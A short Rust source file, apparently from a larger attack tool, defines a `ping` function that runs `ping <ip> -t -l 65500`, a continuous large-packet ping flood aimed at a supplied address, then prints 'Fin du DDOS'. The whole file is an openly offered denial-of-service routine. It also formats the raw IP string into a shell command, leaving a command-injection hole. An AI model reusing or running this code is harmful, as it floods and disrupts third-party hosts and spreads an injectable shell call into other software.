use crate::function_utils::subprocess_run;

use crate::function_utils;

pub(crate) fn ping(ip: &str){
    let cmd= format!("ping {} -t -l 65500",ip);

    let sortie = subprocess_run(&*cmd);

    println!("Fin du DDOS")
}

